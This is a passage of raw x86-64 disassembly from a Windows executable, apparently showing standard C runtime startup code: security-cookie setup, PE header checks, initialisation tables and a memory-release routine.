   140002ce3:	eb 27                	jmp    0x140002d0c
   140002ce5:	33 d2                	xor    %edx,%edx
   140002ce7:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140002ced:	49 8b cf             	mov    %r15,%rcx
   140002cf0:	ff 15 5a 03 01 00    	call   *0x1035a(%rip)        # 0x140013050
   140002cf6:	33 d2                	xor    %edx,%edx
   140002cf8:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140002cfe:	49 8b ce             	mov    %r14,%rcx
   140002d01:	ff 15 49 03 01 00    	call   *0x10349(%rip)        # 0x140013050
   140002d07:	b8 01 00 00 00       	mov    $0x1,%eax
   140002d0c:	4c 8b a4 24 a0 02 00 	mov    0x2a0(%rsp),%r12
   140002d13:	00 
   140002d14:	4c 8b bc 24 a8 02 00 	mov    0x2a8(%rsp),%r15
   140002d1b:	00 
   140002d1c:	48 8b 9c 24 b0 02 00 	mov    0x2b0(%rsp),%rbx
   140002d23:	00 
   140002d24:	48 81 c4 70 02 00 00 	add    $0x270,%rsp
   140002d2b:	41 5e                	pop    %r14
   140002d2d:	41 5d                	pop    %r13
   140002d2f:	5f                   	pop    %rdi
   140002d30:	5e                   	pop    %rsi
   140002d31:	5d                   	pop    %rbp
   140002d32:	c3                   	ret
   140002d33:	48 8b cf             	mov    %rdi,%rcx
   140002d36:	ff 15 e4 02 01 00    	call   *0x102e4(%rip)        # 0x140013020
   140002d3c:	33 d2                	xor    %edx,%edx
   140002d3e:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140002d44:	49 8b cf             	mov    %r15,%rcx
   140002d47:	eb b8                	jmp    0x140002d01
   140002d49:	48 8b cf             	mov    %rdi,%rcx
   140002d4c:	ff 15 ce 02 01 00    	call   *0x102ce(%rip)        # 0x140013020
   140002d52:	eb b3                	jmp    0x140002d07
   140002d54:	b8 01 00 00 00       	mov    $0x1,%eax
   140002d59:	eb c1                	jmp    0x140002d1c
   140002d5b:	cc                   	int3
   140002d5c:	40 53                	rex push %rbx
   140002d5e:	48 83 ec 20          	sub    $0x20,%rsp
   140002d62:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002d67:	e8 08 37 00 00       	call   0x140006474
   140002d6c:	e8 53 05 00 00       	call   0x1400032c4
   140002d71:	8b c8                	mov    %eax,%ecx
   140002d73:	e8 30 41 00 00       	call   0x140006ea8
   140002d78:	e8 3b 05 00 00       	call   0x1400032b8
   140002d7d:	8b d8                	mov    %eax,%ebx
   140002d7f:	e8 a8 43 00 00       	call   0x14000712c
   140002d84:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002d89:	89 18                	mov    %ebx,(%rax)
   140002d8b:	e8 b0 02 00 00       	call   0x140003040
   140002d90:	84 c0                	test   %al,%al
   140002d92:	74 73                	je     0x140002e07
   140002d94:	e8 f7 07 00 00       	call   0x140003590
   140002d99:	48 8d 0d 2c 08 00 00 	lea    0x82c(%rip),%rcx        # 0x1400035cc
   140002da0:	e8 4b 04 00 00       	call   0x1400031f0
   140002da5:	e8 12 05 00 00       	call   0x1400032bc
   140002daa:	8b c8                	mov    %eax,%ecx
   140002dac:	e8 23 39 00 00       	call   0x1400066d4
   140002db1:	85 c0                	test   %eax,%eax
   140002db3:	75 52                	jne    0x140002e07
   140002db5:	e8 12 05 00 00       	call   0x1400032cc
   140002dba:	e8 51 05 00 00       	call   0x140003310
   140002dbf:	85 c0                	test   %eax,%eax
   140002dc1:	74 0c                	je     0x140002dcf
   140002dc3:	48 8d 0d ee 04 00 00 	lea    0x4ee(%rip),%rcx        # 0x1400032b8
   140002dca:	e8 c1 36 00 00       	call   0x140006490
   140002dcf:	e8 0c 05 00 00       	call   0x1400032e0
   140002dd4:	e8 07 05 00 00       	call   0x1400032e0
   140002dd9:	e8 da 04 00 00       	call   0x1400032b8
   140002dde:	8b c8                	mov    %eax,%ecx
   140002de0:	e8 93 42 00 00       	call   0x140007078
   140002de5:	e8 f2 04 00 00       	call   0x1400032dc
   140002dea:	84 c0                	test   %al,%al
   140002dec:	74 05                	je     0x140002df3
   140002dee:	e8 a9 3c 00 00       	call   0x140006a9c
   140002df3:	e8 c0 04 00 00       	call   0x1400032b8
   140002df8:	e8 c3 06 00 00       	call   0x1400034c0
   140002dfd:	85 c0                	test   %eax,%eax
   140002dff:	75 06                	jne    0x140002e07
   140002e01:	48 83 c4 20          	add    $0x20,%rsp
   140002e05:	5b                   	pop    %rbx
   140002e06:	c3                   	ret
   140002e07:	b9 07 00 00 00       	mov    $0x7,%ecx
   140002e0c:	e8 27 05 00 00       	call   0x140003338
   140002e11:	cc                   	int3
   140002e12:	cc                   	int3
   140002e13:	cc                   	int3
   140002e14:	48 83 ec 28          	sub    $0x28,%rsp
   140002e18:	e8 d7 04 00 00       	call   0x1400032f4
   140002e1d:	33 c0                	xor    %eax,%eax
   140002e1f:	48 83 c4 28          	add    $0x28,%rsp
   140002e23:	c3                   	ret
   140002e24:	48 83 ec 28          	sub    $0x28,%rsp
   140002e28:	e8 ef 06 00 00       	call   0x14000351c
   140002e2d:	e8 86 04 00 00       	call   0x1400032b8
   140002e32:	8b c8                	mov    %eax,%ecx
   140002e34:	48 83 c4 28          	add    $0x28,%rsp
   140002e38:	e9 c3 42 00 00       	jmp    0x140007100
   140002e3d:	cc                   	int3
   140002e3e:	cc                   	int3
   140002e3f:	cc                   	int3
   140002e40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002e45:	57                   	push   %rdi
   140002e46:	48 83 ec 30          	sub    $0x30,%rsp
   140002e4a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002e4f:	e8 b0 01 00 00       	call   0x140003004
   140002e54:	84 c0                	test   %al,%al
   140002e56:	0f 84 30 01 00 00    	je     0x140002f8c
   140002e5c:	40 32 ff             	xor    %dil,%dil
   140002e5f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140002e64:	e8 5f 01 00 00       	call   0x140002fc8
   140002e69:	8a d8                	mov    %al,%bl
   140002e6b:	8b 0d 8f bc 01 00    	mov    0x1bc8f(%rip),%ecx        # 0x14001eb00
   140002e71:	83 f9 01             	cmp    $0x1,%ecx
   140002e74:	0f 84 1d 01 00 00    	je     0x140002f97
   140002e7a:	85 c9                	test   %ecx,%ecx
   140002e7c:	75 4a                	jne    0x140002ec8
   140002e7e:	c7 05 78 bc 01 00 01 	movl   $0x1,0x1bc78(%rip)        # 0x14001eb00
   140002e85:	00 00 00 
   140002e88:	48 8d 15 51 05 01 00 	lea    0x10551(%rip),%rdx        # 0x1400133e0
   140002e8f:	48 8d 0d 12 05 01 00 	lea    0x10512(%rip),%rcx        # 0x1400133a8
   140002e96:	e8 b5 3c 00 00       	call   0x140006b50
   140002e9b:	85 c0                	test   %eax,%eax
   140002e9d:	74 0a                	je     0x140002ea9
   140002e9f:	b8 ff 00 00 00       	mov    $0xff,%eax
   140002ea4:	e9 d8 00 00 00       	jmp    0x140002f81
   140002ea9:	48 8d 15 f0 04 01 00 	lea    0x104f0(%rip),%rdx        # 0x1400133a0
   140002eb0:	48 8d 0d d9 04 01 00 	lea    0x104d9(%rip),%rcx        # 0x140013390
   140002eb7:	e8 5c 3c 00 00       	call   0x140006b18
   140002ebc:	c7 05 3a bc 01 00 02 	movl   $0x2,0x1bc3a(%rip)        # 0x14001eb00
   140002ec3:	00 00 00 
   140002ec6:	eb 08                	jmp    0x140002ed0
   140002ec8:	40 b7 01             	mov    $0x1,%dil
   140002ecb:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140002ed0:	8a cb                	mov    %bl,%cl
   140002ed2:	e8 8d 02 00 00       	call   0x140003164
   140002ed7:	e8 40 04 00 00       	call   0x14000331c
   140002edc:	48 8b d8             	mov    %rax,%rbx
   140002edf:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002ee3:	74 1e                	je     0x140002f03
   140002ee5:	48 8b c8             	mov    %rax,%rcx
   140002ee8:	e8 df 01 00 00       	call   0x1400030cc
   140002eed:	84 c0                	test   %al,%al
   140002eef:	74 12                	je     0x140002f03
   140002ef1:	45 33 c0             	xor    %r8d,%r8d
   140002ef4:	41 8d 50 02          	lea    0x2(%r8),%edx
   140002ef8:	33 c9                	xor    %ecx,%ecx
   140002efa:	48 8b 03             	mov    (%rbx),%rax
   140002efd:	ff 15 65 04 01 00    	call   *0x10465(%rip)        # 0x140013368
   140002f03:	e8 1c 04 00 00       	call   0x140003324
   140002f08:	48 8b d8             	mov    %rax,%rbx
   140002f0b:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002f0f:	74 14                	je     0x140002f25
   140002f11:	48 8b c8             	mov    %rax,%rcx
   140002f14:	e8 b3 01 00 00       	call   0x1400030cc
   140002f19:	84 c0                	test   %al,%al
   140002f1b:	74 08                	je     0x140002f25
   140002f1d:	48 8b 0b             	mov    (%rbx),%rcx
   140002f20:	e8 0b 3f 00 00       	call   0x140006e30
   140002f25:	e8 5a 05 00 00       	call   0x140003484
   140002f2a:	0f b7 d8             	movzwl %ax,%ebx
   140002f2d:	e8 72 3b 00 00       	call   0x140006aa4
   140002f32:	44 8b cb             	mov    %ebx,%r9d
   140002f35:	4c 8b c0             	mov    %rax,%r8
   140002f38:	33 d2                	xor    %edx,%edx
   140002f3a:	48 8d 0d bf d0 ff ff 	lea    -0x2f41(%rip),%rcx        # 0x140000000
   140002f41:	e8 3a f8 ff ff       	call   0x140002780
   140002f46:	8b d8                	mov    %eax,%ebx
   140002f48:	e8 7b 05 00 00       	call   0x1400034c8
   140002f4d:	84 c0                	test   %al,%al
   140002f4f:	74 50                	je     0x140002fa1
   140002f51:	40 84 ff             	test   %dil,%dil
   140002f54:	75 05                	jne    0x140002f5b
   140002f56:	e8 b9 3e 00 00       	call   0x140006e14
   140002f5b:	33 d2                	xor    %edx,%edx
   140002f5d:	b1 01                	mov    $0x1,%cl
   140002f5f:	e8 24 02 00 00       	call   0x140003188
   140002f64:	8b c3                	mov    %ebx,%eax
   140002f66:	eb 19                	jmp    0x140002f81
   140002f68:	8b d8                	mov    %eax,%ebx
   140002f6a:	e8 59 05 00 00       	call   0x1400034c8
   140002f6f:	84 c0                	test   %al,%al
   140002f71:	74 36                	je     0x140002fa9
   140002f73:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140002f78:	75 05                	jne    0x140002f7f
   140002f7a:	e8 85 3e 00 00       	call   0x140006e04
   140002f7f:	8b c3                	mov    %ebx,%eax
   140002f81:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002f86:	48 83 c4 30          	add    $0x30,%rsp
   140002f8a:	5f                   	pop    %rdi
   140002f8b:	c3                   	ret
   140002f8c:	b9 07 00 00 00       	mov    $0x7,%ecx
   140002f91:	e8 a2 03 00 00       	call   0x140003338
   140002f96:	90                   	nop
   140002f97:	b9 07 00 00 00       	mov    $0x7,%ecx
   140002f9c:	e8 97 03 00 00       	call   0x140003338
   140002fa1:	8b cb                	mov    %ebx,%ecx
   140002fa3:	e8 c4 3e 00 00       	call   0x140006e6c
   140002fa8:	90                   	nop
   140002fa9:	8b cb                	mov    %ebx,%ecx
   140002fab:	e8 74 3e 00 00       	call   0x140006e24
   140002fb0:	90                   	nop
   140002fb1:	cc                   	int3
   140002fb2:	cc                   	int3
   140002fb3:	cc                   	int3
   140002fb4:	48 83 ec 28          	sub    $0x28,%rsp
   140002fb8:	e8 4b 02 00 00       	call   0x140003208
   140002fbd:	48 83 c4 28          	add    $0x28,%rsp
   140002fc1:	e9 7a fe ff ff       	jmp    0x140002e40
   140002fc6:	cc                   	int3
   140002fc7:	cc                   	int3
   140002fc8:	48 83 ec 28          	sub    $0x28,%rsp
   140002fcc:	e8 cf 08 00 00       	call   0x1400038a0
   140002fd1:	85 c0                	test   %eax,%eax
   140002fd3:	74 21                	je     0x140002ff6
   140002fd5:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140002fdc:	00 00 
   140002fde:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140002fe2:	eb 05                	jmp    0x140002fe9
   140002fe4:	48 3b c8             	cmp    %rax,%rcx
   140002fe7:	74 14                	je     0x140002ffd
   140002fe9:	33 c0                	xor    %eax,%eax
   140002feb:	f0 48 0f b1 0d 14 bb 	lock cmpxchg %rcx,0x1bb14(%rip)        # 0x14001eb08
   140002ff2:	01 00 
   140002ff4:	75 ee                	jne    0x140002fe4
   140002ff6:	32 c0                	xor    %al,%al
   140002ff8:	48 83 c4 28          	add    $0x28,%rsp
   140002ffc:	c3                   	ret
   140002ffd:	b0 01                	mov    $0x1,%al
   140002fff:	eb f7                	jmp    0x140002ff8
   140003001:	cc                   	int3
   140003002:	cc                   	int3
   140003003:	cc                   	int3
   140003004:	48 83 ec 28          	sub    $0x28,%rsp
   140003008:	85 c9                	test   %ecx,%ecx
   14000300a:	75 07                	jne    0x140003013
   14000300c:	c6 05 fd ba 01 00 01 	movb   $0x1,0x1bafd(%rip)        # 0x14001eb10
   140003013:	e8 f0 05 00 00       	call   0x140003608
   140003018:	e8 ab 0a 00 00       	call   0x140003ac8
   14000301d:	84 c0                	test   %al,%al
   14000301f:	75 04                	jne    0x140003025
   140003021:	32 c0                	xor    %al,%al
   140003023:	eb 14                	jmp    0x140003039
   140003025:	e8 3a 46 00 00       	call   0x140007664
   14000302a:	84 c0                	test   %al,%al
   14000302c:	75 09                	jne    0x140003037
   14000302e:	33 c9                	xor    %ecx,%ecx
   140003030:	e8 bb 0a 00 00       	call   0x140003af0
   140003035:	eb ea                	jmp    0x140003021
   140003037:	b0 01                	mov    $0x1,%al
   140003039:	48 83 c4 28          	add    $0x28,%rsp
   14000303d:	c3                   	ret
   14000303e:	cc                   	int3
   14000303f:	cc                   	int3
   140003040:	40 53                	rex push %rbx
   140003042:	48 83 ec 20          	sub    $0x20,%rsp
   140003046:	80 3d c4 ba 01 00 00 	cmpb   $0x0,0x1bac4(%rip)        # 0x14001eb11
   14000304d:	8b d9                	mov    %ecx,%ebx
   14000304f:	75 67                	jne    0x1400030b8
   140003051:	83 f9 01             	cmp    $0x1,%ecx
   140003054:	77 6a                	ja     0x1400030c0
   140003056:	e8 45 08 00 00       	call   0x1400038a0
   14000305b:	85 c0                	test   %eax,%eax
   14000305d:	74 28                	je     0x140003087
   14000305f:	85 db                	test   %ebx,%ebx
   140003061:	75 24                	jne    0x140003087
   140003063:	48 8d 0d ae ba 01 00 	lea    0x1baae(%rip),%rcx        # 0x14001eb18
   14000306a:	e8 59 44 00 00       	call   0x1400074c8
   14000306f:	85 c0                	test   %eax,%eax
   140003071:	75 10                	jne    0x140003083
   140003073:	48 8d 0d b6 ba 01 00 	lea    0x1bab6(%rip),%rcx        # 0x14001eb30
   14000307a:	e8 49 44 00 00       	call   0x1400074c8
   14000307f:	85 c0                	test   %eax,%eax
   140003081:	74 2e                	je     0x1400030b1
   140003083:	32 c0                	xor    %al,%al
   140003085:	eb 33                	jmp    0x1400030ba
   140003087:	66 0f 6f 05 41 05 01 	movdqa 0x10541(%rip),%xmm0        # 0x1400135d0
   14000308e:	00 
   14000308f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003093:	f3 0f 7f 05 7d ba 01 	movdqu %xmm0,0x1ba7d(%rip)        # 0x14001eb18
   14000309a:	00 
   14000309b:	48 89 05 86 ba 01 00 	mov    %rax,0x1ba86(%rip)        # 0x14001eb28
   1400030a2:	f3 0f 7f 05 86 ba 01 	movdqu %xmm0,0x1ba86(%rip)        # 0x14001eb30
   1400030a9:	00 
   1400030aa:	48 89 05 8f ba 01 00 	mov    %rax,0x1ba8f(%rip)        # 0x14001eb40
   1400030b1:	c6 05 59 ba 01 00 01 	movb   $0x1,0x1ba59(%rip)        # 0x14001eb11
   1400030b8:	b0 01                	mov    $0x1,%al
   1400030ba:	48 83 c4 20          	add    $0x20,%rsp
   1400030be:	5b                   	pop    %rbx
   1400030bf:	c3                   	ret
   1400030c0:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400030c5:	e8 6e 02 00 00       	call   0x140003338
   1400030ca:	cc                   	int3
   1400030cb:	cc                   	int3
   1400030cc:	48 83 ec 18          	sub    $0x18,%rsp
   1400030d0:	4c 8b c1             	mov    %rcx,%r8
   1400030d3:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400030d8:	66 39 05 21 cf ff ff 	cmp    %ax,-0x30df(%rip)        # 0x140000000
   1400030df:	75 78                	jne    0x140003159
   1400030e1:	48 63 0d 54 cf ff ff 	movslq -0x30ac(%rip),%rcx        # 0x14000003c
   1400030e8:	48 8d 15 11 cf ff ff 	lea    -0x30ef(%rip),%rdx        # 0x140000000
   1400030ef:	48 03 ca             	add    %rdx,%rcx
   1400030f2:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400030f8:	75 5f                	jne    0x140003159
   1400030fa:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400030ff:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140003103:	75 54                	jne    0x140003159
   140003105:	4c 2b c2             	sub    %rdx,%r8
   140003108:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   14000310c:	48 83 c2 18          	add    $0x18,%rdx
   140003110:	48 03 d1             	add    %rcx,%rdx
   140003113:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140003117:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000311b:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   14000311f:	48 89 14 24          	mov    %rdx,(%rsp)
   140003123:	49 3b d1             	cmp    %r9,%rdx
   140003126:	74 18                	je     0x140003140
   140003128:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   14000312b:	4c 3b c1             	cmp    %rcx,%r8
   14000312e:	72 0a                	jb     0x14000313a
   140003130:	8b 42 08             	mov    0x8(%rdx),%eax
   140003133:	03 c1                	add    %ecx,%eax
   140003135:	4c 3b c0             	cmp    %rax,%r8
   140003138:	72 08                	jb     0x140003142
   14000313a:	48 83 c2 28          	add    $0x28,%rdx
   14000313e:	eb df                	jmp    0x14000311f
   140003140:	33 d2                	xor    %edx,%edx
   140003142:	48 85 d2             	test   %rdx,%rdx
   140003145:	75 04                	jne    0x14000314b
   140003147:	32 c0                	xor    %al,%al
   140003149:	eb 14                	jmp    0x14000315f
   14000314b:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   14000314f:	7d 04                	jge    0x140003155
   140003151:	32 c0                	xor    %al,%al
   140003153:	eb 0a                	jmp    0x14000315f
   140003155:	b0 01                	mov    $0x1,%al
   140003157:	eb 06                	jmp    0x14000315f
   140003159:	32 c0                	xor    %al,%al
   14000315b:	eb 02                	jmp    0x14000315f
   14000315d:	32 c0                	xor    %al,%al
   14000315f:	48 83 c4 18          	add    $0x18,%rsp
   140003163:	c3                   	ret
   140003164:	40 53                	rex push %rbx
   140003166:	48 83 ec 20          	sub    $0x20,%rsp
   14000316a:	8a d9                	mov    %cl,%bl
   14000316c:	e8 2f 07 00 00       	call   0x1400038a0
   140003171:	33 d2                	xor    %edx,%edx
   140003173:	85 c0                	test   %eax,%eax
   140003175:	74 0b                	je     0x140003182
   140003177:	84 db                	test   %bl,%bl
   140003179:	75 07                	jne    0x140003182
   14000317b:	48 87 15 86 b9 01 00 	xchg   %rdx,0x1b986(%rip)        # 0x14001eb08
   140003182:	48 83 c4 20          	add    $0x20,%rsp
   140003186:	5b                   	pop    %rbx
   140003187:	c3                   	ret
   140003188:	40 53                	rex push %rbx
   14000318a:	48 83 ec 20          	sub    $0x20,%rsp
   14000318e:	80 3d 7b b9 01 00 00 	cmpb   $0x0,0x1b97b(%rip)        # 0x14001eb10
   140003195:	8a d9                	mov    %cl,%bl
   140003197:	74 04                	je     0x14000319d
   140003199:	84 d2                	test   %dl,%dl
   14000319b:	75 0c                	jne    0x1400031a9
   14000319d:	e8 d6 44 00 00       	call   0x140007678
   1400031a2:	8a cb                	mov    %bl,%cl
   1400031a4:	e8 47 09 00 00       	call   0x140003af0
   1400031a9:	b0 01                	mov    $0x1,%al
   1400031ab:	48 83 c4 20          	add    $0x20,%rsp
   1400031af:	5b                   	pop    %rbx
   1400031b0:	c3                   	ret
   1400031b1:	cc                   	int3
   1400031b2:	cc                   	int3
   1400031b3:	cc                   	int3
   1400031b4:	40 53                	rex push %rbx
   1400031b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400031ba:	48 83 3d 56 b9 01 00 	cmpq   $0xffffffffffffffff,0x1b956(%rip)        # 0x14001eb18
   1400031c1:	ff 
   1400031c2:	48 8b d9             	mov    %rcx,%rbx
   1400031c5:	75 07                	jne    0x1400031ce
   1400031c7:	e8 a8 42 00 00       	call   0x140007474
   1400031cc:	eb 0f                	jmp    0x1400031dd
   1400031ce:	48 8b d3             	mov    %rbx,%rdx
   1400031d1:	48 8d 0d 40 b9 01 00 	lea    0x1b940(%rip),%rcx        # 0x14001eb18
   1400031d8:	e8 13 43 00 00       	call   0x1400074f0
   1400031dd:	33 d2                	xor    %edx,%edx
   1400031df:	85 c0                	test   %eax,%eax
   1400031e1:	48 0f 44 d3          	cmove  %rbx,%rdx
   1400031e5:	48 8b c2             	mov    %rdx,%rax
   1400031e8:	48 83 c4 20          	add    $0x20,%rsp
   1400031ec:	5b                   	pop    %rbx
   1400031ed:	c3                   	ret
   1400031ee:	cc                   	int3
   1400031ef:	cc                   	int3
   1400031f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400031f4:	e8 bb ff ff ff       	call   0x1400031b4
   1400031f9:	48 f7 d8             	neg    %rax
   1400031fc:	1b c0                	sbb    %eax,%eax
   1400031fe:	f7 d8                	neg    %eax
   140003200:	ff c8                	dec    %eax
   140003202:	48 83 c4 28          	add    $0x28,%rsp
   140003206:	c3                   	ret
   140003207:	cc                   	int3
   140003208:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000320d:	55                   	push   %rbp
   14000320e:	48 8b ec             	mov    %rsp,%rbp
   140003211:	48 83 ec 30          	sub    $0x30,%rsp
   140003215:	48 8b 05 24 ae 01 00 	mov    0x1ae24(%rip),%rax        # 0x14001e040
   14000321c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140003223:	2b 00 00 
   140003226:	48 3b c3             	cmp    %rbx,%rax
   140003229:	75 77                	jne    0x1400032a2
   14000322b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000322f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140003236:	00 
   140003237:	ff 15 fb fe 00 00    	call   *0xfefb(%rip)        # 0x140013138
   14000323d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003241:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003245:	ff 15 e5 fe 00 00    	call   *0xfee5(%rip)        # 0x140013130
   14000324b:	8b c0                	mov    %eax,%eax
   14000324d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140003251:	ff 15 d1 fe 00 00    	call   *0xfed1(%rip)        # 0x140013128
   140003257:	8b c0                	mov    %eax,%eax
   140003259:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000325d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140003261:	ff 15 b9 fe 00 00    	call   *0xfeb9(%rip)        # 0x140013120
   140003267:	8b 45 18             	mov    0x18(%rbp),%eax
   14000326a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000326e:	48 c1 e0 20          	shl    $0x20,%rax
   140003272:	48 33 45 18          	xor    0x18(%rbp),%rax
   140003276:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000327a:	48 33 c1             	xor    %rcx,%rax
   14000327d:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140003284:	ff 00 00 
   140003287:	48 23 c1             	and    %rcx,%rax
   14000328a:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140003291:	2b 00 00 
   140003294:	48 3b c3             	cmp    %rbx,%rax
   140003297:	48 0f 44 c1          	cmove  %rcx,%rax
   14000329b:	48 89 05 9e ad 01 00 	mov    %rax,0x1ad9e(%rip)        # 0x14001e040
   1400032a2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400032a7:	48 f7 d0             	not    %rax
   1400032aa:	48 89 05 cf ad 01 00 	mov    %rax,0x1adcf(%rip)        # 0x14001e080
   1400032b1:	48 83 c4 30          	add    $0x30,%rsp
   1400032b5:	5d                   	pop    %rbp
   1400032b6:	c3                   	ret
   1400032b7:	cc                   	int3
   1400032b8:	33 c0                	xor    %eax,%eax
   1400032ba:	c3                   	ret
   1400032bb:	cc                   	int3
   1400032bc:	b8 01 00 00 00       	mov    $0x1,%eax
   1400032c1:	c3                   	ret
   1400032c2:	cc                   	int3
   1400032c3:	cc                   	int3
   1400032c4:	b8 00 40 00 00       	mov    $0x4000,%eax
   1400032c9:	c3                   	ret
   1400032ca:	cc                   	int3
   1400032cb:	cc                   	int3
   1400032cc:	48 8d 0d 7d b8 01 00 	lea    0x1b87d(%rip),%rcx        # 0x14001eb50
   1400032d3:	48 ff 25 66 fe 00 00 	rex.W jmp *0xfe66(%rip)        # 0x140013140
   1400032da:	cc                   	int3
   1400032db:	cc                   	int3
   1400032dc:	b0 01                	mov    $0x1,%al
   1400032de:	c3                   	ret
   1400032df:	cc                   	int3
   1400032e0:	c2 00 00             	ret    $0x0
   1400032e3:	cc                   	int3
   1400032e4:	48 8d 05 75 b8 01 00 	lea    0x1b875(%rip),%rax        # 0x14001eb60
   1400032eb:	c3                   	ret
   1400032ec:	48 8d 05 75 b8 01 00 	lea    0x1b875(%rip),%rax        # 0x14001eb68
   1400032f3:	c3                   	ret
   1400032f4:	48 83 ec 28          	sub    $0x28,%rsp
   1400032f8:	e8 e7 ff ff ff       	call   0x1400032e4
   1400032fd:	48 83 08 24          	orq    $0x24,(%rax)
   140003301:	e8 e6 ff ff ff       	call   0x1400032ec
   140003306:	48 83 08 02          	orq    $0x2,(%rax)
   14000330a:	48 83 c4 28          	add    $0x28,%rsp
   14000330e:	c3                   	ret
   14000330f:	cc                   	int3
   140003310:	33 c0                	xor    %eax,%eax
   140003312:	39 05 ec ac 01 00    	cmp    %eax,0x1acec(%rip)        # 0x14001e004
   140003318:	0f 94 c0             	sete   %al
   14000331b:	c3                   	ret
   14000331c:	48 8d 05 7d c8 01 00 	lea    0x1c87d(%rip),%rax        # 0x14001fba0
   140003323:	c3                   	ret
   140003324:	48 8d 05 6d c8 01 00 	lea    0x1c86d(%rip),%rax        # 0x14001fb98
   14000332b:	c3                   	ret
   14000332c:	c7 05 3a b8 01 00 00 	movl   $0x0,0x1b83a(%rip)        # 0x14001eb70
   140003333:	00 00 00 
   140003336:	c3                   	ret
   140003337:	cc                   	int3
   140003338:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000333d:	55                   	push   %rbp
   14000333e:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140003345:	ff 
   140003346:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   14000334d:	8b d9                	mov    %ecx,%ebx
   14000334f:	b9 17 00 00 00       	mov    $0x17,%ecx
   140003354:	ff 15 1e fe 00 00    	call   *0xfe1e(%rip)        # 0x140013178
   14000335a:	85 c0                	test   %eax,%eax
   14000335c:	74 04                	je     0x140003362
   14000335e:	8b cb                	mov    %ebx,%ecx
   140003360:	cd 29                	int    $0x29
   140003362:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003367:	e8 c0 ff ff ff       	call   0x14000332c
   14000336c:	33 d2                	xor    %edx,%edx
   14000336e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003372:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140003378:	e8 b3 e4 00 00       	call   0x140011830
   14000337d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003381:	ff 15 c1 fd 00 00    	call   *0xfdc1(%rip)        # 0x140013148
   140003387:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   14000338e:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140003395:	48 8b cb             	mov    %rbx,%rcx
   140003398:	45 33 c0             	xor    %r8d,%r8d
   14000339b:	ff 15 af fd 00 00    	call   *0xfdaf(%rip)        # 0x140013150
   1400033a1:	48 85 c0             	test   %rax,%rax
   1400033a4:	74 3f                	je     0x1400033e5
   1400033a6:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1400033ad:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1400033b4:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400033bb:	00 00 
   1400033bd:	4c 8b c8             	mov    %rax,%r9
   1400033c0:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400033c5:	4c 8b c3             	mov    %rbx,%r8
   1400033c8:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400033cf:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400033d4:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400033d8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400033dd:	33 c9                	xor    %ecx,%ecx
   1400033df:	ff 15 73 fd 00 00    	call   *0xfd73(%rip)        # 0x140013158
   1400033e5:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400033ec:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033f1:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400033f8:	33 d2                	xor    %edx,%edx
   1400033fa:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
